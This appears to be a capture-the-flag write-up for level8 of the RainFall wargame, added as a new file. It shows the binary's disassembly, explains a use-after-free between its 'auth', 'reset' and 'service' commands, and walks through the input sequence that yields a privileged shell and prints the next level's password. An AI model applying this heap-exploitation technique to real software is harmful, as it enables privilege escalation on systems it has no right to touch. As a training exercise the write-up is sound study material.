@@ -1,0 +1,250 @@
+so let's try to execute the level8
+
+└─$ ./level8                     
+(nil), (nil) 
+a
+(nil), (nil) 
+a
+(nil), (nil) 
+
+is look take multiple input and write some information 
+
+so let's decompile the software to look waht is make 
+
+ public main
+.text:08048564 main            proc near               ; DATA XREF: _start+17↑o
+.text:08048564
+.text:08048564 s               = byte ptr -88h
+.text:08048564 argc            = dword ptr  8
+.text:08048564 argv            = dword ptr  0Ch
+.text:08048564 envp            = dword ptr  10h
+.text:08048564
+.text:08048564 ; __unwind {
+.text:08048564                 push    ebp
+.text:08048565                 mov     ebp, esp
+.text:08048567                 push    edi
+.text:08048568                 push    esi
+.text:08048569                 and     esp, 0FFFFFFF0h
+.text:0804856C                 sub     esp, 0A0h
+.text:08048572                 jmp     short loc_8048575
+.text:08048574 ; ---------------------------------------------------------------------------
+.text:08048574
+.text:08048574 loc_8048574:                            ; CODE XREF: main+178↓j
+.text:08048574                                         ; main+196↓j ...
+.text:08048574                 nop
+.text:08048575
+.text:08048575 loc_8048575:                            ; CODE XREF: main+E↑j
+.text:08048575                 mov     ecx, ds:service
+.text:0804857B                 mov     edx, ds:auth
+.text:08048581                 mov     eax, offset format ; "%p, %p \n"
+.text:08048586                 mov     [esp+8], ecx
+.text:0804858A                 mov     [esp+4], edx
+.text:0804858E                 mov     [esp], eax      ; format
+.text:08048591                 call    _printf
+.text:08048596                 mov     eax, ds:stdin@@GLIBC_2_0
+.text:0804859B                 mov     [esp+8], eax    ; stream
+.text:0804859F                 mov     dword ptr [esp+4], 80h ; n
+.text:080485A7                 lea     eax, [esp+0A8h+s]
+.text:080485AB                 mov     [esp], eax      ; s
+.text:080485AE                 call    _fgets
+.text:080485B3                 test    eax, eax
+.text:080485B5                 jz      loc_804872C
+.text:080485BB                 lea     eax, [esp+20h]
+.text:080485BF                 mov     edx, eax
+.text:080485C1                 mov     eax, offset aAuth ; "auth "
+.text:080485C6                 mov     ecx, 5
+.text:080485CB                 mov     esi, edx
+.text:080485CD                 mov     edi, eax
+.text:080485CF                 repe cmpsb
+.text:080485D1                 setnbe  dl
+.text:080485D4                 setb    al
+.text:080485D7                 mov     ecx, edx
+.text:080485D9                 sub     cl, al
+.text:080485DB                 mov     eax, ecx
+.text:080485DD                 movsx   eax, al
+.text:080485E0                 test    eax, eax
+.text:080485E2                 jnz     short loc_8048642
+.text:080485E4                 mov     dword ptr [esp], 4 ; size
+.text:080485EB                 call    _malloc
+.text:080485F0                 mov     ds:auth, eax
+.text:080485F5                 mov     eax, ds:auth
+.text:080485FA                 mov     dword ptr [eax], 0
+.text:08048600                 lea     eax, [esp+20h]
+.text:08048604                 add     eax, 5
+.text:08048607                 mov     dword ptr [esp+1Ch], 0FFFFFFFFh
+.text:0804860F                 mov     edx, eax
+.text:08048611                 mov     eax, 0
+.text:08048616                 mov     ecx, [esp+1Ch]
+.text:0804861A                 mov     edi, edx
+.text:0804861C                 repne scasb
+.text:0804861E                 mov     eax, ecx
+.text:08048620                 not     eax
+.text:08048622                 sub     eax, 1
+.text:08048625                 cmp     eax, 1Eh
+.text:08048628                 ja      short loc_8048642
+.text:0804862A                 lea     eax, [esp+20h]
+.text:0804862E                 lea     edx, [eax+5]
+.text:08048631                 mov     eax, ds:auth
+.text:08048636                 mov     [esp+4], edx    ; src
+.text:0804863A                 mov     [esp], eax      ; dest
+.text:0804863D                 call    _strcpy
+.text:08048642
+.text:08048642 loc_8048642:                            ; CODE XREF: main+7E↑j
+.text:08048642                                         ; main+C4↑j
+.text:08048642                 lea     eax, [esp+20h]
+.text:08048646                 mov     edx, eax
+.text:08048648                 mov     eax, offset aReset ; "reset"
+.text:0804864D                 mov     ecx, 5
+.text:08048652                 mov     esi, edx
+.text:08048654                 mov     edi, eax
+.text:08048656                 repe cmpsb
+.text:08048658                 setnbe  dl
+.text:0804865B                 setb    al
+.text:0804865E                 mov     ecx, edx
+.text:08048660                 sub     cl, al
+.text:08048662                 mov     eax, ecx
+.text:08048664                 movsx   eax, al
+.text:08048667                 test    eax, eax
+.text:08048669                 jnz     short loc_8048678
+.text:0804866B                 mov     eax, ds:auth
+.text:08048670                 mov     [esp], eax      ; ptr
+.text:08048673                 call    _free
+.text:08048678
+.text:08048678 loc_8048678:                            ; CODE XREF: main+105↑j
+.text:08048678                 lea     eax, [esp+20h]
+.text:0804867C                 mov     edx, eax
+.text:0804867E                 mov     eax, offset aService ; "service"
+.text:08048683                 mov     ecx, 6
+.text:08048688                 mov     esi, edx
+.text:0804868A                 mov     edi, eax
+.text:0804868C                 repe cmpsb
+.text:0804868E                 setnbe  dl
+.text:08048691                 setb    al
+.text:08048694                 mov     ecx, edx
+.text:08048696                 sub     cl, al
+.text:08048698                 mov     eax, ecx
+.text:0804869A                 movsx   eax, al
+.text:0804869D                 test    eax, eax
+.text:0804869F                 jnz     short loc_80486B5
+.text:080486A1                 lea     eax, [esp+20h]
+.text:080486A5                 add     eax, 7
+.text:080486A8                 mov     [esp], eax      ; s
+.text:080486AB                 call    _strdup
+.text:080486B0                 mov     ds:service, eax
+.text:080486B5
+.text:080486B5 loc_80486B5:                            ; CODE XREF: main+13B↑j
+.text:080486B5                 lea     eax, [esp+20h]
+.text:080486B9                 mov     edx, eax
+.text:080486BB                 mov     eax, offset aLogin ; "login"
+.text:080486C0                 mov     ecx, 5
+.text:080486C5                 mov     esi, edx
+.text:080486C7                 mov     edi, eax
+.text:080486C9                 repe cmpsb
+.text:080486CB                 setnbe  dl
+.text:080486CE                 setb    al
+.text:080486D1                 mov     ecx, edx
+.text:080486D3                 sub     cl, al
+.text:080486D5                 mov     eax, ecx
+.text:080486D7                 movsx   eax, al
+.text:080486DA                 test    eax, eax
+.text:080486DC                 jnz     loc_8048574
+.text:080486E2                 mov     eax, ds:auth
+.text:080486E7                 mov     eax, [eax+20h]
+.text:080486EA                 test    eax, eax
+.text:080486EC                 jz      short loc_80486FF
+.text:080486EE                 mov     dword ptr [esp], offset command ; "/bin/sh"
+.text:080486F5                 call    _system
+.text:080486FA                 jmp     loc_8048574
+.text:080486FF ; ---------------------------------------------------------------------------
+.text:080486FF
+.text:080486FF loc_80486FF:                            ; CODE XREF: main+188↑j
+.text:080486FF                 mov     eax, ds:stdout@@GLIBC_2_0
+.text:08048704                 mov     edx, eax
+.text:08048706                 mov     eax, offset aPassword ; "Password:\n"
+.text:0804870B                 mov     [esp+0Ch], edx  ; s
+.text:0804870F                 mov     dword ptr [esp+8], 0Ah ; n
+.text:08048717                 mov     dword ptr [esp+4], 1 ; size
+.text:0804871F                 mov     [esp], eax      ; ptr
+.text:08048722                 call    _fwrite
+.text:08048727                 jmp     loc_8048574
+.text:0804872C ; ---------------------------------------------------------------------------
+.text:0804872C
+.text:0804872C loc_804872C:                            ; CODE XREF: main+51↑j
+.text:0804872C                 nop
+.text:0804872D                 mov     eax, 0
+.text:08048732                 lea     esp, [ebp-8]
+.text:08048735                 pop     esi
+.text:08048736                 pop     edi
+.text:08048737                 pop     ebp
+.text:08048738                 retn
+.text:08048738 ; } // starts at 8048564
+.text:08048738 main            endp
+.text:08048738
+
+
+
+
+is really huge 
+
+but i trys some stuff and i find the solution juste by test so let's decompile and explaim
+
+
+
+actually i have 3 function 
+auth 
+services 
+login 
+reset
+
+and have 2 global value auth and service 
+
+let's deep dive insisde
+
+auth get 30 element from the stdin after auth and make a malloc of 4 element
+and put the malloc inside the auth global value
+
+reset free the global value auth
+
+service make a strdup from the stdin and store inside the service global value
+
+and login juste compare if is something si write in auth + 32 octet 
+and if is correct launch a shell is not correct write password: in the stdout
+
+so actually the goal is to write more than 30 octet ins the gloabl value auth
+
+so for that is prety easy because the service make strudp and have no limitation 
+and the free value not reset the auth value to the null pointer 
+
+
+here is a simple use after free element
+
+
+so let's start to exploit
+
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+
+
+use the auth value to make a malloc and store in the auth global value
+auth a 
+0x804a008, (nil) 
+
+
+now use the reset to say to malloc now is free but the value in global value auth is now change !
+reset
+0x804a008, (nil) 
+
+now juste make a big buffer of more than 32 octet because the last malloc is free malloc use the last location 
+
+service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018 
+
+now juste login and because the value of auth is store now the strup of service is more than 32 octet
+login
+
+and get the flag !
+$ id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
